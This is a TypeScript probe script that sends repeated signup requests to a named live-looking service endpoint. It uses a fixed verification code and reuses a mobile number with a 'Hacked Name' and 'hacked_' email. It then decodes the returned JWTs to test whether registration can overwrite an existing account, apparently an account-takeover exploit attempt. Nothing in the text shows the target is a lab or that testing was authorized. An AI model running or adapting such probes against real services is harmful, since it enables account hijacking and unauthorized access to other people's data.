import axios from 'axios';
async function probe() {
  const url = 'http://account.cubric.io/api/designer';
  const myMobile = `010${Math.floor(Math.random() * 99999 + 10000)}0`; // just some number
  const email = `dto${Date.now()}@example.com`;
  const name = 'Login Test';
  const dto = {
    mobileNumber: myMobile, verifyNumber: '123456', name, email,
    gender: 'Female', birthday: '1990-01-01T00:00:00Z',
    signedBy: 'Email', socialLoginId: null, isServiceTermsAgreed: true,
    isPrivacyPolicyAgreed: true, isLocationServiceTermsAgreed: true, isMarketingTermsAgreed: false, referralCode: null
  };
  try {
    const r1 = await axios.post(url, dto);
    
    // even more minimal - just mobile
    const newEmail = `hacked_${Date.now()}@example.com`;
    const minDto2 = {
        mobileNumber: myMobile, verifyNumber: '123456', name: "Hacked Name", email: newEmail,
        gender: 'Female', birthday: '1990-01-01T00:00:00Z',
        signedBy: 'Email', isServiceTermsAgreed: true, isPrivacyPolicyAgreed: true,
        isLocationServiceTermsAgreed: true, isMarketingTermsAgreed: false
    };
    await axios.post(url, minDto2);
    
    // Now check if it's the same token / ID
    function parseJwt (token) {
        return JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
    }
    const token1 = r1.headers['x-cubric-designer-token'];
    
    // wait I didn't save r3. Let me do it.
    const r3 = await axios.post(url, minDto2);
    const token3 = r3.headers['x-cubric-designer-token'];
    
    console.log('ID1:', parseJwt(token1).id);
    console.log('ID3:', parseJwt(token3).id);
    console.log('Are IDs same?:', parseJwt(token1).id === parseJwt(token3).id);
    console.log('JWT 3 email:', parseJwt(token3).email);
    
  } catch (err: any) {}
}
probe();
